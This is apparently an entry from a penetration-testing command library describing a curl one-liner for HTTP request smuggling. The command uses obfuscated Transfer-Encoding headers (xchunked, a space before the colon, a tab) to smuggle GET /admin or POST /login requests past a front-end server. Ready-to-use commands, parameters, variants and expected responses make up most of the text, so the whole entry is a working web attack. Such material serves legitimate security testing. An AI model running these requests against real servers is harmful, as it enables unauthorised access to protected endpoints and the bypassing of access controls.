---
type: command
executor: bash
data: >-
  curl -X POST -H "Transfer-Encoding: xchunked" --data "0\r\n\r\nGET /admin
  HTTP/1.1\r\nHost: \$\$_TARGET_HOST\r\n\r\n\r\n\r\n" \$\$_TARGET_URL
output: null
platforms:
  - Linux
  - macOS
tags:
  - request-smuggling
  - http
verified: true
validated: true
---

# curl-obfuscated-te-header

## Command

```bash
curl -X POST -H "Transfer-Encoding: xchunked" --data "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: $_TARGET_HOST\r\n\r\n\r\n\r\n" $_TARGET_URL
```

## Description

This command sends an HTTP POST request using curl with an obfuscated Transfer-Encoding header to test for request smuggling vulnerabilities. It appends a smuggled GET request after the chunked body terminator. Use this in environments where Burp Suite is unavailable, substituting different obfuscations for testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_TARGET_URL` | The target endpoint URL (e.g., http://example.com/search) | Yes |
| `$_TARGET_HOST` | The host header value (e.g., example.com) | Yes |
| `-H "Transfer-Encoding: xchunked"` | Obfuscated TE header variant | Yes |
| `--data "..."` | Chunked body with smuggled request | Yes |

## Examples

### Basic Usage with xchunked Obfuscation

```bash
curl -X POST -H "Transfer-Encoding: xchunked" --data "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n\r\n\r\n" http://example.com/search
```

### Advanced Usage with Space Obfuscation

```bash
curl -X POST -H "Transfer-Encoding : chunked" --data "0\r\n\r\nPOST /login HTTP/1.1\r\nHost: example.com\r\nContent-Length: 0\r\n\r\n\r\n\r\n" http://example.com/search
```

### Tab Obfuscation Variant

```bash
curl -X POST -H $'Transfer-Encoding:[tab]chunked' --data "0\r\n\r\n" http://example.com/search
```

## Expected Output

A successful smuggling response might show the front-end accepting the request (200 OK or similar), but follow-up requests returning the smuggled payload, such as:

```
HTTP/1.1 200 OK
...
[Content from /admin page or error indicating desynchronization]
```

If blocked, expect 400 Bad Request or WAF rejection.

## Related

- [[procedures/Obfuscate-TE-Header-for-HTTP-Request-Smuggling]]
- [[tools/Burp-Suite]]
